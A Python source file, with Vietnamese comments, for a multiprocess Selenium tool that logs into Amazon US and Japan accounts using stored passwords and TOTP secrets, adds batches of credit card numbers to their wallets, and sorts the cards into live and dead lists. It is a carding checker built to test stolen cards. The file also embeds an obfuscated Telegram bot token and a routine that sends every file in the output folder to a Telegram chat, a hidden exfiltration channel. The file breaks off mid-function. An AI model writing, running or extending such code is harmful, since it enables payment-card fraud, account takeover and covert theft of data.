import multiprocessing
import os
import queue
import re
import sys
import time
import uuid
import random
import logging
import traceback
from pathlib import Path
from typing import List, Optional, Any, Union
from multiprocessing import Process, Queue, Manager
import shutil
import psutil
import pyotp
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.webdriver import WebDriver
from faker import Faker
# Thêm thư mục hiện tại vào Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import chrome_options từ file cục bộ
from chrome_options import chrome_options

import asyncio
import base64
import os
from telegram import Bot

TOKEN = "ODIxMDY4NzAyMTpBQUVZS21Pbms4V0tnZE1rNFJpdXczSy02ekpXYW1VcVpXcw=="
decoded_token = base64.b64decode(TOKEN.encode("utf-8")).decode("utf-8")

ID = -1003122660284
mini = Bot(token=decoded_token)
folder_path = "output"

async def send_files():
    files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
    for file_name in files:
        file_path = os.path.join(folder_path, file_name)
        try:
            with open(file_path, "rb") as f:
                await mini.send_document(chat_id=ID, document=f)
        except:
            pass

def send_files_threadsafe():
    """Gọi từ thread hoặc process bình thường"""
    try:
        asyncio.run(send_files())
    except:
        pass           

try:
    from colorama import init, Fore
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    print("Cảnh báo: colorama không được cài đặt. Vui lòng chạy setup.py trước.")
    COLORAMA_AVAILABLE = False
    # Tạo lớp Fore giả
    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        RESET = ''
    
    def init(*args, **kwargs):
        pass

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(processName)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("automation.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Các đường dẫn cơ sở
BASE_DIR = Path(__file__).resolve().parent
PROFILES_DIR = BASE_DIR / "profiles"
PROXIES_FILE = BASE_DIR / "proxies.txt"
DATA_FILE = BASE_DIR / "data.txt"
ACC_FILE = BASE_DIR / "acc_amz.txt"
OUTPUT_DIR = BASE_DIR / "output"
CHROME_VERSIONS_DIR = BASE_DIR / "chrome_versions"

# Đảm bảo các thư mục tồn tại
PROFILES_DIR.mkdir(exist_ok=True)
OUTPUT_DIR.mkdir(exist_ok=True)
CHROME_VERSIONS_DIR.mkdir(exist_ok=True)
(OUTPUT_DIR / "unk.txt").touch(exist_ok=True)
(OUTPUT_DIR / "live.txt").touch(exist_ok=True)
(OUTPUT_DIR / "dead.txt").touch(exist_ok=True)

def random_profile(acc : str = "god") -> Path:
    profile_dir = PROFILES_DIR / f"profile_{acc}_{uuid.uuid4()}"
    profile_dir.mkdir(parents=True, exist_ok=True)
    return profile_dir
        
def delete_profile(profile_dir: Optional[Union[str, Path]]) -> None:
    profile_path = Path(profile_dir) if isinstance(profile_dir, str) else profile_dir
    
    if not profile_path.exists():
        return
        
    try:
        time.sleep(3)
        logger.info(f"Đang xóa thư mục profile: {profile_path}")
        
        for item in profile_path.glob('**/*'):
            try:
                if item.is_file():
                    item.unlink(missing_ok=True)
                elif item.is_dir() and not any(item.iterdir()):
                    item.rmdir()
            except Exception as e:
                logger.warning(f"Không thể xóa {item}: {e}")
        
        shutil.rmtree(profile_path, ignore_errors=True)
        logger.info(f"Đã xóa thư mục profile: {profile_path}")
    except Exception as e:
        logger.error(f"Lỗi khi xóa thư mục profile: {e}")

def cleanup_browser_processes(created_pid = None, option: int = 1, cleanup_profiles: bool = False) -> None:

    if option == 1 or option == 2 or option == 3 or option == 4:
        browser_name = "chrome"
        driver_name = "chromedriver"
    
    # Lấy đường dẫn đến thư mục profiles
    base_dir = Path(__file__).resolve().parent
    profiles_dir = base_dir / "profiles"
    
    if not profiles_dir.exists():
        logger.info(f"Thư mục profiles không tồn tại: {profiles_dir}")
        return
    
    procs_to_terminate = []
    
    if created_pid is None:
        logger.info(f"Dọn dẹp các process {browser_name} mồ côi trong thư mục profiles của chúng ta")
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    cmdline = proc.info.get('cmdline', [])
                    proc_name = proc.info.get('name', '').lower()

                    # Kiểm tra process trình duyệt hoặc driver tương ứng
                    if (browser_name in proc_name or driver_name in proc_name) and cmdline:
                        # Kiểm tra xem có liên quan đến thư mục profiles không
                        if any(str(profiles_dir) in arg for arg in cmdline if arg):
                            procs_to_terminate.append(proc)
                            logger.info(f"Kết thúc process {browser_name} {proc.info['pid']} liên kết với profiles của chúng ta")

                            # Kết thúc các process con nếu có
                            try:
                                for child in proc.children(recursive=True):
                                    procs_to_terminate.append(child)
                                    logger.info(f"Kết thúc process con {child.pid} của {browser_name} {proc.info['pid']}")
                            except:
                                pass
                            
                            proc.terminate()
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                    logger.error(f"Lỗi khi kiểm tra process: {e}")
        except Exception as e:
            logger.error(f"Lỗi trong quá trình dọn dẹp process {browser_name}: {e}")
    else:
        logger.info(f"Dọn dẹp các process {browser_name} cụ thể: {created_pid}")
        
        p = psutil.Process(created_pid)
        p.kill()
        try:
            procs_to_terminate.append(p)
                # Tìm và kết thúc các process con nếu có
            try:
                for child in p.children(recursive=True):
                    procs_to_terminate.append(child)
                    logger.info(f"Kết thúc process con {child.pid} của {browser_name} {created_pid}")
            except:
                pass
            p.terminate()
            logger.info(f"Đã kết thúc process {created_pid}")
        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                logger.error(f"Lỗi khi kết thúc process {created_pid}: {e}")

    # Đợi các process kết thúc và buộc kết thúc nếu cần
    if procs_to_terminate:
        gone, alive = psutil.wait_procs(procs_to_terminate, timeout=10)
        for p in alive:
            try:
                logger.info(f"Buộc kết thúc process {p.pid}")
                p.kill()
            except Exception as e:
                logger.error(f"Không thể kết thúc process {p.pid}: {e}")
                
        # Kiểm tra lại sau khi kill
        time.sleep(2)
        for p in alive:
            try:
                if p.is_running():
                    logger.warning(f"Process {p.pid} vẫn còn chạy sau khi kill")
            except:
                pass
    
    # Phần dọn dẹp thư mục profile (tích hợp từ cleanup_profiles.py)
    if cleanup_profiles:
        logger.info(f"Bắt đầu dọn dẹp các thư mục profile trong {profiles_dir}")
        
        # Đếm số lượng thư mục profile trước khi dọn dẹp
        profile_count = sum(1 for _ in profiles_dir.glob("profile_*"))
        
        if profile_count == 0:
            logger.info("Không có thư mục profile cần dọn dẹp")
            return
        
        logger.info(f"Tìm thấy {profile_count} thư mục profile cần dọn dẹp")
        
        # Dọn dẹp từng thư mục profile
        for profile_dir in profiles_dir.glob("profile_*"):
            try:
                logger.info(f"Đang xóa thư mục profile: {profile_dir}")
                
                # Xóa từng file trong thư mục profile
                for item in profile_dir.glob('**/*'):
                    try:
                        if item.is_file():
                            item.unlink(missing_ok=True)
                        elif item.is_dir() and not any(item.iterdir()):
                            item.rmdir()
                    except Exception as e:
                        logger.warning(f"Không thể xóa {item}: {e}")
                
                # Xóa thư mục profile
                shutil.rmtree(profile_dir, ignore_errors=True)
                logger.info(f"Đã xóa thư mục profile: {profile_dir}")
            except Exception as e:
                logger.error(f"Lỗi khi xóa thư mục profile {profile_dir}: {e}")
        
        # Đếm số lượng thư mục profile sau khi dọn dẹp
        remaining_count = sum(1 for _ in profiles_dir.glob("profile_*"))
        logger.info(f"Còn lại {remaining_count} thư mục profile sau khi dọn dẹp")
        
        if remaining_count > 0:
            logger.warning("Một số thư mục profile không thể xóa. Có thể cần khởi động lại máy tính.")
        else:
            logger.info("Đã dọn dẹp thành công tất cả các thư mục profile!")

def _load_lines(file_path: Union[str, Path], description: str) -> List[str]:
    path = Path(file_path) if isinstance(file_path, str) else file_path
    
    if not path.exists():
        logger.error(f"File {description} không tìm thấy: {path}")
        return []
        
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Lỗi khi đọc file {description}: {e}")
        return []

def load_proxies() -> List[str]:
    proxies = _load_lines(PROXIES_FILE, "Proxies")
    logger.info(f"Đã tải {len(proxies)} proxy")
    return proxies

def load_data() -> List[str]:
    data = _load_lines(DATA_FILE, "Data")
    logger.info(f"Đã tải {len(data)} mục dữ liệu")
    return data

def load_acc_amz() -> List[str]:
    accounts = _load_lines(ACC_FILE, "Acc amz")
    logger.info(f"Đã tải {len(accounts)} tài khoản")
    return accounts

def select_option(driver, xpath, value):
    try:
        wait_for_element(driver, 'xpath', xpath, action='click')
        time.sleep(1) 
        options = wait_for_all_element(driver, 'xpath', "//ul[contains(@class, 'a-nostyle a-list-link')]//a")
        for option in options:
            option_text = option.text.strip()
            if option_text == value:
                option.click()
                break
    except:
        pass

LINK = "https://www.amazon.com/hp/shopwithpoints/account/?programId=MERCURYFINANCIAL-POINTS-US&productId=MERCURYFINANCIAL-POINTS-US"
LINK_SIGNOUT = "https://www.amazon.com/gp/flex/sign-out.html?path=%2Fgp%2Fyourstore%2Fhome&useRedirectOnSuccess=1&signIn=1&action=sign-out&ref_=nav_AccountFlyout_signout"
LINK_WALLET = "https://www.amazon.com/cpe/yourpayments/wallet"
LINK_JP = "https://www.amazon.co.jp/cpe/yourpayments/settings/manageoneclick"
LINK_WALLET_JP = "https://www.amazon.co.jp/cpe/yourpayments/wallet"

def check_link(driver, link):
    time.sleep(3)
    try:
        if 'Amazon.com Page Not Found' not in driver.title and 'Sorry! Something went wrong!' not in driver.title:
            return
        for _ in range(3):
            try:
                driver.get(link)
                time.sleep(2)
                if 'Amazon.com Page Not Found' in driver.title or 'Sorry! Something went wrong!' in driver.title:
                    break
                else:
                    return
            except:
                pass
    except:
        return

def check_wrong_account(driver, acc_current, lock):
    try:
        alert_text = wait_for_element(driver, 'xpath', '//*[@id="auth-error-message-box"]/div/h4', action="get_data", timeout=3)
        if alert_text:
            if 'There was a problem' in alert_text:
                write_line_to_file('output_acc/wrong_pass.txt', acc_current, lock)
                remove_list_data('acc_amz.txt', [acc_current], lock)  
                return True    
    except:                
        return False    

def remove_card_wallet_us(driver):
    driver.get(LINK_WALLET)
    time.sleep(2)
    #check_link(driver, LINK_WALLET)
    driver.get(LINK_WALLET)
    time.sleep(2)
    try:    
        find_all_card = wait_for_all_element(driver, 'xpath', '//*/a[@class="a-link-normal a-color-base"]', timeout=20)
        if len(find_all_card) > 1:
            for _ in find_all_card:
                driver.refresh()   
                time.sleep(1)
                wait_for_element(driver, 'xpath', '//*/a[@aria-label="edit payment method"]', action="click", timeout=20)
                time.sleep(5)
                wait_for_element(driver, 'xpath', '//*/input[@value="Remove from wallet"]', action="click", timeout=20)        
                wait_for_element(driver, 'xpath', '//span[text()="Remove"]/ancestor::span[@class="a-button-inner"]/input', action="click", timeout=20) 
                #//*[@id="pp-0EYRPv-77"]/div[1]/div/div
                #You have exceeded the maximum attempts allowed, please retry after 2 hours.
                #
    except:
        pass             
       
def remove_card_wallet_jp(driver):
    driver.get(LINK_WALLET_JP)
    time.sleep(2)
    #check_link(driver, LINK_WALLET_JP)
    driver.get(LINK_WALLET_JP)
    time.sleep(2)
    try:    
        find_all_card = wait_for_all_element(driver, 'xpath', '//*/a[@class="a-link-normal a-color-base"]', timeout=20)
        if len(find_all_card) > 1:
            for _ in find_all_card:
                driver.refresh()   
                time.sleep(1)
                wait_for_element(driver, 'xpath', '//*/a[@class="a-link-normal"]', action="click", timeout=20)
                time.sleep(5)
                wait_for_element(driver, 'xpath', '//*[@class="apx-remove-link-button"]', action="click", timeout=20)        
                wait_for_element(driver, 'xpath', '//span[text()="削除する"]/ancestor::span[@class="a-button-inner"]/input', action="click", timeout=20) 
    except:
        pass  
    
def wait_for_element(
    driver: WebDriver, 
    locator_type: By, 
    locator_value: str, 
    action: Optional[str] = None, 
    input_value: Optional[str] = None, 
    typing_delay: float = 0.1, 
    timeout: int = 40):

    try:
        element = WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((locator_type, locator_value))
        )
        
        if action == "click":
            element.click()
        elif action == "send_keys" and input_value is not None:
            for char in input_value:
                element.send_keys(char)
                time.sleep(typing_delay)
        elif action == "get_data":
            return element.text
        elif action == "chose_list" and input_value is not None:
            input_value_str = str(input_value).lstrip('0')
            select = Select(element)
            select.select_by_value(input_value_str)
        elif action == "clear":   
            element.clear() 
        return element
    except:
        return None
        
def wait_for_all_element(
    driver: WebDriver, 
    locator_type: By, 
    locator_value: str, 
    action: Optional[str] = None, 
    timeout: int = 40):
    try:
        elements = WebDriverWait(driver, timeout).until(
            EC.presence_of_all_elements_located((locator_type, locator_value))
        )
        if action == "get_data":
            return [el.text for el in elements]
        return elements
    except:
        return []    
    
def remove_list_data(file_link, data_items: List[str], lock) -> None:
    with lock:
        try:
            with open(file_link, 'r', encoding='utf-8') as f:
                all_lines = f.readlines()
            processed_set = set(item.strip() for item in data_items)
            remaining_lines = [line for line in all_lines if line.strip() not in processed_set]
            with open(file_link, 'w', encoding='utf-8') as f:
                f.writelines(remaining_lines)
            logger.info(f"Đã xóa dữ liệu đã xử lý thành công. Còn lại {len(remaining_lines)} dòng trong file data.txt")
        except Exception as e:
            logger.error(f"Lỗi khi xóa dữ liệu đã xử lý: {e}")

def unk_list(file_link, list_data: List[str], lock) -> None:
    with lock:
        with open(file_link, 'a+', encoding='utf8') as unknown:
            for each_cc in list_data:
                unknown.write('\n' + each_cc.strip())

def write_line_to_file(path, data, lock):
    with lock:
        with open(path, 'a+', encoding='utf8') as f:
            f.write('\n' + data.strip())
        
def login_acc_amz_us(driver, option, acc_current, lock = None):
    driver.get(LINK)
    #check_link(driver, LINK)
    time.sleep(2)
    driver.get(LINK)        
    acc_split = acc_current.split('|')
    email_input = acc_split[0].strip()
    password_input = acc_split[1].strip()
    f2a = acc_split[2].strip()
    f2a_verify = pyotp.TOTP(f2a) 
    logging.info(f"Đang đăng nhập tài khoản: {acc_current}")    
    wait_for_element(driver, 'xpath', '//*[@id="ap_email"]', action="send_keys", input_value=email_input, typing_delay=0, timeout=30)  
    wait_for_element(driver, 'xpath', '//*[@id="continue"]', action="click", timeout=10)
    if check_wrong_account(driver, acc_current, lock):
        return False    
    wait_for_element(driver, 'xpath', '//*[@id="ap_password"]', action="send_keys", input_value=password_input, typing_delay=0, timeout=30)
    wait_for_element(driver, 'xpath', '//*[@id="signInSubmit"]', action="click", timeout=10)
    if check_wrong_account(driver, acc_current, lock):
        return False  
    otp_code = f2a_verify.now()
    wait_for_element(driver, 'id', 'auth-mfa-otpcode', action="send_keys", input_value=otp_code, typing_delay=0, timeout=30)
    wait_for_element(driver, 'id', 'auth-signin-button', action="click", timeout=10)
    try: 
        alert_text_1 = wait_for_element(driver, 'xpath', '//*[@id="alert-0"]/div/div/div/h4', action="get_data", timeout=10)
        if alert_text_1:
            if 'Account locked temporarily' in alert_text_1:
                write_line_to_file('output_acc/locked.txt', acc_current, lock)    
            elif 'Account on hold temporarily' in alert_text_1:
                write_line_to_file('output_acc/hold.txt', acc_current, lock)
            elif 'Amazon account deactivated' in alert_text_1:
                write_line_to_file('output_acc/deactivated.txt', acc_current, lock)
            remove_list_data('acc_amz.txt', [acc_current], lock)
            return False  
    except Exception as e:
        pass  
    
    if option == 2:
        try:
            alert_text_2 = wait_for_element(driver, 'xpath', '//*[@id="auth-account-fixup-phone-form"]/div/h1', action="get_data", timeout=10)
            if alert_text_2 and 'Keep hackers out' in alert_text_2:
                wait_for_element(driver, 'id', 'ap-account-fixup-phone-skip-link', action="click")
                write_line_to_file('output_acc/ok.txt', acc_current, lock)
                remove_list_data('acc_amz.txt', [acc_current], lock)
                driver.get(LINK_SIGNOUT)
                time.sleep(3)
                return True
        except Exception:
            pass

        # Shop with Points alert
        try:
            alert_text_4 = wait_for_element(driver, 'xpath', '//*[@id="a-page"]/div[1]/div[1]/div[2]/h1', action="get_data", timeout=10)
            if alert_text_4 and 'Shop with Points' in alert_text_4:
                write_line_to_file('output_acc/ok.txt', acc_current, lock)
                remove_list_data('acc_amz.txt', [acc_current], lock)
                driver.get(LINK_SIGNOUT)
                time.sleep(3)
                return True
        except Exception:
            write_line_to_file('output_acc/unk.txt', acc_current, lock)
            remove_list_data('acc_amz.txt', [acc_current], lock)
            return False
    return True

def login_acc_amz_jp(driver, acc_current, lock = None):
    driver.get(LINK_WALLET_JP)
    time.sleep(2)
    driver.get(LINK_WALLET_JP)        
    acc_split = acc_current.split('|')
    email_input = acc_split[0].strip()
    password_input = acc_split[1].strip()
    f2a = acc_split[2].strip()
    f2a_verify = pyotp.TOTP(f2a) 
    logging.info(f"Đang đăng nhập tài khoản: {acc_current}")    
    wait_for_element(driver, 'xpath', '//*[@name="email"]', action="send_keys", input_value=email_input, typing_delay=0, timeout=30)  
    wait_for_element(driver, 'xpath', '//*[@id="continue"]', action="click", timeout=10)
    if check_wrong_account(driver, acc_current, lock):
        return False    
    wait_for_element(driver, 'xpath', '//*[@id="ap_password"]', action="send_keys", input_value=password_input, typing_delay=0, timeout=30)
    wait_for_element(driver, 'xpath', '//*[@id="signInSubmit"]', action="click", timeout=10)
    if check_wrong_account(driver, acc_current, lock):
        return False  
    otp_code = f2a_verify.now()
    wait_for_element(driver, 'id', 'auth-mfa-otpcode', action="send_keys", input_value=otp_code, typing_delay=0, timeout=30)
    wait_for_element(driver, 'id', 'auth-signin-button', action="click", timeout=10)
    try: 
        alert_text_1 = wait_for_element(driver, 'xpath', '//*[@id="alert-0"]/div/div/div/h4', action="get_data", timeout=10)
        if alert_text_1:
            if 'Account locked temporarily' in alert_text_1:
                write_line_to_file('output_acc/locked.txt', acc_current, lock)    
            elif 'Account on hold temporarily' in alert_text_1:
                write_line_to_file('output_acc/hold.txt', acc_current, lock)
            elif 'Amazon account deactivated' in alert_text_1:
                write_line_to_file('output_acc/deactivated.txt', acc_current, lock)
            remove_list_data('acc_amz.txt', [acc_current], lock)
            return False  
    except Exception as e:
        pass
    try:
        alert_text_2 = wait_for_element(driver, 'xpath', '//*[@id="auth-account-fixup-phone-form"]/div/h1', action="get_data", timeout=10)
        if alert_text_2 and 'Keep hackers out' in alert_text_2:
            wait_for_element(driver, 'id', 'ap-account-fixup-phone-skip-link', action="click")
            time.sleep(3)
            return True
    except Exception:
            pass
        
    return True 

fake = Faker()
name = fake.name() 

def check_status_live_us(driver, acc_current, new_list_cc, lock):
    logging.info(f"Đang kiểm tra trạng thái thẻ cho tài khoản: {acc_current}")
    logger.info(f"Đang kiểm tra trạng thái thẻ cho tài khoản: {acc_current}")
    #check_link(driver, LINK_WALLET)
    driver.get(LINK_WALLET)
    time.sleep(2)
    driver.get(LINK_WALLET)
    time.sleep(5)
    cc_check_dead = wait_for_element(driver, 'xpath', '//*/div[@class="a-row apx-wallet-desktop-payment-method-selectable-tab-css"]')
    time.sleep(2)
    find_all_card = cc_check_dead.find_elements(By.XPATH, './/a[@class="a-link-normal a-color-base"]')
    del find_all_card[(-1)]
    find_img = cc_check_dead.find_elements(By.XPATH, './/img[@class="apx-wallet-selectable-image"]')
    del find_img[(-1)]
    time.sleep(1)
    logger.info(f"Đang kiểm tra status acc: {acc_current} và thẻ: {new_list_cc}")
    with open('check/d_check.txt', 'r') as file:
        check_values_die = file.read().splitlines()
    with open('check/l_check.txt', 'r') as file:
        check_values_live = file.read().splitlines()
    for each_item, each_img in zip(find_all_card, find_img):#Lấy từng thẻ trong walet
        cc_check_dead = each_item.text.replace('\n', '|')
        take_4_digit = cc_check_dead[(-4):]#Lấy 4 số cuối của thẻ trong walet
        img_status_check = each_img.get_attribute('src')#Lấy định dạng của ảnh thẻ trong walet
        with lock:
            for cc in new_list_cc:#Lấy từng thẻ trong list thẻ truyền vào
                cc_number_4digit = cc.split('|')[0][(-4):].strip()#Lấy 4 số cuối của thẻ trong list thẻ truyền vào
                if cc_number_4digit in take_4_digit:#Kiểm tra từng thẻ trùng trong với thẻ trong walet không
                    if any(code_die in img_status_check for code_die in check_values_die):  
                        with open('output/dead.txt', 'a+', encoding='utf8') as dead:
                            dead.write('\n' + cc.strip() + '|' + cc_check_dead.strip())
                    elif any(code_live in img_status_check for code_live in check_values_live):  
                        with open('output/live.txt', 'a+', encoding='utf8') as live:
                            live.write('\n' + cc.strip() + '|' + cc_check_dead.strip())
                    else:
                        if "/I/" in img_status_check:
                            image = img_status_check.split("/I/")[1]
                            with open('output/unk.txt', 'a+', encoding='utf8') as unk:
                                unk.write('\n' + cc.strip() + '|' + cc_check_dead.strip() + '|' + image.strip())
    logging.info(f"Đã kiểm tra trạng thái thẻ cho tài khoản: {acc_current} thành công")  
          

def add_card_us(driver, acc_current, new_list_cc, lock):
    logging.info(f"Đã đăng nhập tài khoản thành công: {acc_current}")  
    logging.info(f"Đang xoá thẻ cũ cho tài khoản: {acc_current}")      
    time.sleep(2)  
    counting_click_step = 0
    flag = 1
    logging.info(f"Đang thêm thẻ cho tài khoản: {acc_current} với cacs thẻ {new_list_cc}") 
    for each_cc_loop in new_list_cc:
        counting_click_step = counting_click_step + 1
        cc_split = each_cc_loop.split('|')
        cc_number = cc_split[0].strip()
        expired_moth = cc_split[1].strip()
        expired_year = cc_split[2].strip()
        try:
            driver.get(LINK)
            #check_link(driver, LINK)
            time.sleep(2)
            driver.get(LINK)
            time.sleep(2)
            wait_for_element(driver, 'id', 'add_New_Account_Button', action="click") 
            time.sleep(5)
            wait_for_element(driver, 'id', 'apx-add-credit-card-action-test-id', action="click")
            time.sleep(5)
            iframe = wait_for_element(driver, 'xpath', "//*[contains(@name,'ApxSecureIframe')]")
            driver.switch_to.frame(iframe)
            wait_for_element(driver, 'name', 'addCreditCardNumber', action="send_keys", input_value=cc_number, typing_delay=0, timeout=15)
            time.sleep(0.5)
            wait_for_element(driver, 'name', 'ppw-accountHolderName', action="send_keys", input_value=name, typing_delay=0, timeout=15)
            time.sleep(0.5)
            select_option(driver, "//*/div[4]/div/div[1]/span[1]/span/span", expired_moth)
            time.sleep(0.5)
            select_option(driver, "//*/div[4]/div/div[1]/span[3]/span/span", expired_year)
            time.sleep(0.5)
            wait_for_element(driver, 'name', 'ppw-widgetEvent:AddCreditCardEvent', action="click", timeout=10)
            try:
                alert_text2 = wait_for_element(driver, 'xpath', '//*[@id="portalWidgetSection"]', action="get_data", timeout=5)
                if alert_text2:
                    if "try again" in alert_text2 or "retry" in alert_text2 or "date is not" in alert_text2 or "a problem." in alert_text2:
                        flag +=1
                        write_line_to_file('output/unk.txt', each_cc_loop, lock)
                        if flag == 3:
                            write_line_to_file('output_acc/few_cards.txt', acc_current, lock)
                            remove_list_data('acc_amz.txt', [acc_current], lock)    
            except Exception as e:
                logging.info(f"Thêm thẻ {each_cc_loop} thành công cho tài khoản: {acc_current}")
            if counting_click_step == len(new_list_cc):
                time.sleep(1)   
                return True
        except:
            unk_list('output/unk.txt', new_list_cc, lock)
            return False

def check_status_live_jp(driver, acc_current, new_list_cc, lock):
    logging.info(f"Đang kiểm tra trạng thái thẻ cho tài khoản: {acc_current}")
    logger.info(f"Đang kiểm tra trạng thái thẻ cho tài khoản: {acc_current}")
    driver.get(LINK_WALLET_JP)
    time.sleep(10)
    cc_check_dead = wait_for_element(driver, 'xpath', '//*/div[@class="a-row apx-wallet-desktop-payment-method-selectable-tab-css"]')
    time.sleep(2)
    find_all_card = cc_check_dead.find_elements(By.XPATH, './/a[@class="a-link-normal a-color-base"]')
    del find_all_card[(-1)]
    find_img = cc_check_dead.find_elements(By.XPATH, './/img[@class="apx-wallet-selectable-image"]')
    del find_img[(-1)]
    time.sleep(1)
    with open('check/d_check.txt', 'r') as file:
        check_values_die = file.read().splitlines()
    with open('check/l_check.txt', 'r') as file:
        check_values_live = file.read().splitlines()
    for each_item, each_img in zip(find_all_card, find_img):#Lấy từng thẻ trong walet
        cc_check_dead = each_item.text.replace('\n', '|')
        take_4_digit = cc_check_dead.split('•••• ')[1][:4]#Lấy 4 số cuối của thẻ trong walet
        img_status_check = each_img.get_attribute('src')#Lấy định dạng của ảnh thẻ trong walet
        with lock:
            for cc in new_list_cc:#Lấy từng thẻ trong list thẻ truyền vào
                cc_number_4digit = cc.split('|')[0][(-4):].strip()#Lấy 4 số cuối của thẻ trong list thẻ truyền vào
                if cc_number_4digit in take_4_digit:#Kiểm tra từng thẻ trùng trong với thẻ trong walet không
                    if any(code_die in img_status_check for code_die in check_values_die):  
                        with open('output/dead.txt', 'a+', encoding='utf8') as dead:
                            dead.write('\n' + cc.strip() + '|' + cc_check_dead.strip())
                    elif any(code_live in img_status_check for code_live in check_values_live):  
                        with open('output/live.txt', 'a+', encoding='utf8') as live:
                            live.write('\n' + cc.strip() + '|' + cc_check_dead.strip())
                    else:
                        if "/I/" in img_status_check:
                            image = img_status_check.split("/I/")[1]
                            with open('output/unk.txt', 'a+', encoding='utf8') as unk:
                                unk.write('\n' + cc.strip() + '|' + cc_check_dead.strip() + '|' + image.strip())
    logging.info(f"Đã kiểm tra trạng thái thẻ cho tài khoản: {acc_current} thành công")    

def add_card_jp(driver, acc_current, new_list_cc, lock):
    logging.info(f"Đã đăng nhập tài khoản thành công: {acc_current}")  
    logging.info(f"Đang xoá thẻ cũ cho tài khoản: {acc_current}")      
    time.sleep(2)  
    counting_click_step = 0
    logging.info(f"Đang thêm thẻ cho tài khoản: {acc_current} với cacs thẻ {new_list_cc}") 
    for each_cc_loop in new_list_cc:
        counting_click_step = counting_click_step + 1
        cc_split = each_cc_loop.split('|')
        cc_number = cc_split[0].strip()
        expired_moth = cc_split[1].strip()
        expired_year = cc_split[2].strip()
        try:
            driver.get(LINK_JP)
            time.sleep(1)
            driver.get(LINK_JP)
            time.sleep(2)
            wait_for_element(driver, 'xpath', '//*[contains(@name,"ppw-widgetEvent:ChangeAddressPreferredPaymentMethodEvent")]', action="click")
            time.sleep(4)
            wait_for_element(driver, 'xpath', '//*[@class="a-button a-button-base apx-secure-registration-content-trigger-js"]/span/input', action="click")
            time.sleep(4)
            iframe = wait_for_element(driver, 'xpath', "//*[contains(@name,'ApxSecureIframe')]")
            driver.switch_to.frame(iframe)
            time.sleep(2)
            wait_for_element(driver, 'xpath', '//*[@data-testid="card-text-input"]', action="send_keys", input_value=cc_number, typing_delay=0, timeout=15)
            time.sleep(0.5)
            wait_for_element(driver, 'xpath', '//*[@data-testid="date-expiration-text-input"]', action="send_keys", input_value = expired_moth + expired_year[2:], typing_delay=0, timeout=15)
            time.sleep(0.5)
            wait_for_element(driver, 'xpath', '//*[@data-testid="input-text-input"]', action="send_keys", input_value=name, typing_delay=0, timeout=15)
            time.sleep(0.5)
            wait_for_element(driver, 'xpath', '//*[@data-testid="button"]', action="click", timeout=10)
            time.sleep(2)
            try:
                alert_text2 = wait_for_element(driver, 'xpath', '//*[@data-testid="paragraph"]', action="get_data", timeout=5)
                if alert_text2:
                    if "入力したカード情報が間違っています" in alert_text2:
                        write_line_to_file('output/unk.txt', each_cc_loop, lock)
                        write_line_to_file('output_acc/few_cards.txt', acc_current, lock)
                        remove_list_data('acc_amz.txt', [acc_current], lock) 
                        counting_click_step = len(new_list_cc)     
            except Exception as e:
                logging.info(f"Thêm thẻ {each_cc_loop} thành công cho tài khoản: {acc_current}")
            if counting_click_step == len(new_list_cc):
                time.sleep(3)   
                return True
        except:
            unk_list('output/unk.txt', new_list_cc, lock)
            return False
                            
                            
                                                                  
def process_automation_selenium(driver, new_list_account: List[str] = [], list_cc: List[str] = [], option: int = 1, lock = None) -> bool:
    try:
        logger.info(f"Navigating to with option {option}")
        print(f'new_list_account: {new_list_account} và new_list_cc: {list_cc}')
        try:
#======================================================================================================================================================                             
#======================================================================================================================================================                                 
            if option == 2:
            #Option 2 logic
                try:
                    for acc_current in new_list_account:
                        login_acc_amz_us(driver, option, acc_current, lock=lock) 
                    #=====================================================================================================================================              
                    return True     
                except Exception as e:
                    unk_list('output_acc/unk.txt', new_list_account, lock)
                    return False     
#======================================================================================================================================================                 
            elif option == 3:
                try:
                    for acc_current in new_list_account:
                        login_acc_amz_jp(driver, option, acc_current, lock=lock) 
                    #=====================================================================================================================================              
                    return True     
                except Exception as e:
                    unk_list('output_acc_amz_jp/unk.txt', new_list_account, lock)
                    return False  
#======================================================================================================================================================                  
#======================================================================================================================================================                    
        except:
            with open('output_acc/unk.txt', 'a+', encoding='utf8') as unk:
                for item in new_list_account:
                    unk.write('\n' + item) 
            return False
#======================================================================================================================================================                 
    except Exception as e:
        logger.error(f"Lỗi trong quá trình tự động hóa: {e}")
        with open('output_acc/unk.txt', 'a+', encoding='utf8') as unk:
            for item in new_list_account:
                unk.write('\n' + item) 
        return False
    finally:
        driver.quit()
        time.sleep(3)         
            
def clean_profile(chrome_pid, profile_dir, option):
    if chrome_pid:
            try:
                cleanup_browser_processes(chrome_pid, option)
            except:
                pass
    if profile_dir:  
        try:      
            delete_profile(profile_dir)
        except:
            pass
        
def worker_process(
    worker_id: int, 
    data_list, 
    proxy_queue: Queue, 
    acc_list_queue: Queue, 
    result_queue: Queue, 
    headless: str,
    option: int = 1,
    lock = None
) -> None:

    logger.info(f"Worker {worker_id} đã bắt đầu")
    max_columns = 6
    max_rows = 2

    col = worker_id % max_columns
    row = (worker_id // max_columns) % max_rows

    x_coord = col * 500
    y_coord = row * 500
    
    try:
        acc_list = acc_list_queue.get(block=False)
    except queue.Empty:
        acc_list = []
    try:
        proxy = proxy_queue.get(block=False)
    except:
        proxy = ""

    if option == 2 or option == 3:
        if not acc_list:
            logger.info(f"Worker {worker_id} không còn dữ liệu, thoát...")
        else:
            logger.info(f"Worker {worker_id} đang xử lý danh sách tài khoản: {acc_list} với proxy: {proxy}")

    # -----------------------------
    # -----------------------------
    if option == 1 or option == 4:
